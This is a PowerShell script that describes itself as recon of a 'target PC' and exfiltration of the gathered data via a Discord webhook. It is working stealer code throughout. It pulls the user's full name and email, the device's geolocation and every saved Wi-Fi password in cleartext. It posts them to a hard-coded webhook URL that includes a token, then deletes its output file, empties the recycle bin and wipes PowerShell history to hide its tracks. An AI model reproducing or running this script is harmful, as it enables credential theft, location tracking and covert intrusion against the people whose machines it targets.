<# 
.SYNOPSIS
Advanced recon of a target PC and exfiltration of gathered data via Discord webhook.
.DESCRIPTION 
This script gathers detailed information from a target PC and sends a summary to a specified Discord webhook.
#>

#############################################################################################################
# Configuration Variables
$DiscordWebhookUrl = "https://discord.com/api/webhooks/1305290003944833035/pzY6f_l01DPtZTxZnvmKQhCCieC-Z4z1yegIXySBcxIPoZhrN-npmasRTFSuk3fflQGW"
$OutputFileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"
$OutputFilePath = "$env:TMP\$OutputFileName"
#############################################################################################################

# Function: Get Full Name
function Get-FullName {
    try {
        $fullName = (net user $env:USERNAME | Select-String -Pattern "Full Name").ToString().Trim()
        return $fullName
    } catch {
        return $env:USERNAME
    }
}

# Function: Get Email
function Get-Email {
    try {
        $email = (gpresult -z /USER $env:USERNAME | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})").ToString().Trim()
        return $email
    } catch {
        return "No Email Detected"
    }
}

# Function: Get GeoLocation
function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100
        }
        if ($GeoWatcher.Permission -eq 'Denied') {
            return "Access Denied"
        } else {
            return $GeoWatcher.Position.Location | Select Latitude, Longitude
        }
    } catch {
        return "No Coordinates Found"
    }
}

# Function: Get Wi-Fi Passwords
function Get-WifiPasswords {
    try {
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            $_ -match ':\s*(.+)$' | Out-Null
            $profile = $matches[1]
            $keyContent = netsh wlan show profile "$profile" key=clear | Select-String "Key Content"
if ($keyContent) { "${profile}: $($keyContent -replace 'Key Content\s*:\s*', '')" }
        }
        return $profiles -join "`n"
    } catch {
        return "No Wi-Fi profiles found or access denied."
    }
}

# Function: Send to Discord
function Send-ToDiscord {
    param ($Message)
    $payload = @{
        "content" = "```$Message```"
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType "application/json" -Body $payload
        Write-Host "Data sent to Discord successfully."
    } catch {
        Write-Error "Failed to send data to Discord."
    }
}


# Main Script: Gather Information
$FullName = Get-FullName
$Email = Get-Email
$GeoLocation = Get-GeoLocation
$WiFiPasswords = Get-WifiPasswords
$HostName = $env:COMPUTERNAME
$SystemInfo = "User: $FullName`nEmail: $Email`nHostname: $HostName`nGeoLocation: $GeoLocation`nWi-Fi Passwords:`n$WiFiPasswords"

# Save Information to File
$SystemInfo | Out-File -FilePath $OutputFilePath -Encoding UTF8

# Exfiltrate Data to Discord
Send-ToDiscord -Message $SystemInfo

# Cleanup
if (Test-Path -Path $OutputFilePath) {
    Remove-Item -Path $OutputFilePath -Force -ErrorAction SilentlyContinue
}
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Signal Completion
(New-Object -ComObject Wscript.Shell).Popup("Script execution complete", 1)
